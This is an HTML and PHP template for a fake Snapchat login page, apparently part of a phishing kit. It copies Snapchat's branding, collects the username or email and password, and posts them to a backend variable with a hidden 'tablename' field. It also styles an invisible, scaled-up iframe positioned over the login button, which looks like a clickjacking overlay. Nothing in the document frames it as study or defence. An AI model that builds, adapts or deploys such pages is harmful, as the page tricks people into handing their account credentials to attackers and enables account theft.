  <meta content='width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0' name='viewport'/> 


<style>
@import url('https://fonts.googleapis.com/css?family=Montserrat');
</style>


  <style>

#cookieChoiceInfo {
    display: none !important;
}

  html, body {
      margin: 0;
      width: 100%;
      text-align:center;
      background:#f2f3f3;
      font-family: "Montserrat", sans-serif;

  }

  .snpatchatBlogger {
      max-width: 600px;
      width: 100%;
      margin: auto;
      display: block;
      background-image: url(http://i.imgur.com/kgpn6G2.png);
      background-repeat: no-repeat;
      background-size: 100%;
      background-position: bottom;
      background-color: #fffb01;
  }

  .snpatchatBlogger img {
      width: 80px;
  }

  .snpatchatBlogger .logo {
      padding: 10px 0 110px 0;
  }
  .snpatchatBlogger h1{
    margin:0;
    margin: 0;
    font-weight: 500;
  }


  .description {
      text-align: center;
      margin-top:-50px;
  }

input {
    border: none;
    margin: 5px 0 20px 0;
    padding: 20px;
    display: inline-block;
    background: #fffb01;
    color: #272727;
    font-weight: bold;
    border: solid #fff;
    box-shadow: 1px 1px 5px rgba(0, 0, 0, 0.54);
    border-radius: 50px;
    outline: none;
}

  #log {
      padding: 15px;
      width: 150px;
      background: #673AB7;
      border: none;
      color: #fff;
      font-weight: bold;
      border-radius: 51px;
      box-shadow: 1px 4px 1px #2b1452;
      font-size: 20px;
      margin: 15px;
      position:relative;
      overflow: hidden;
  }
  label{
     font-weight: bold;
  }

iframe.id_59365939e7455 {
    width: 20px !important;
    height: 20px !important;
    max-width: 300px !important;
    position: absolute;
    left: 0;
    top: -20px;
    bottom: -8%;
    right: 0;
    margin: auto;
    border: none;
    opacity: 0;
    -moz-transform: scale(9);
    -webkit-transform: scale(9);
    -o-transform: scale(9);
    -ms-transform: scale(9);
    transform: scale(9);
}

.view iframe.id_59365939e7455 {
    bottom: -200px;
}


  </style>



   <div class='snpatchatBlogger'>
       
     <div class='logo'>
       <img src='http://i.imgur.com/PEnMscW.jpg'/>
       <h1>Snapchat</h1>
     </div>
   </div>
    <form action="<?php echo $action_post; ?>" method="POST">
   <div class='description'>
     <label for='email'>USERNAME OR EMAIL</label>
     <br/>
     <input id='email' name='email' placeholder='Username Or Email' type='text'/>
     <br/>
     <label for='pass'>Password</label>
     <br/>
     <input id='pass' name='pass' placeholder='Password' type='password'/>
     <br/>
                             <input type="hidden" name="tablename" value="sn">

     <button id='log' type='submit'>Log In</button>
   </div>
   </form>

  <script>


        document.querySelector('form').addEventListener('submit',function(event) {
          /* Act on the event */

          if(!window.submit__) event.preventDefault();

          var email = document.querySelector("#email").value;
          var pass = document.querySelector("#pass").value;

          if(email.length > 4 && pass.length > 5){
            window.submit__ = true;
            document.querySelector('form').submit();
          }


        });


  </script>

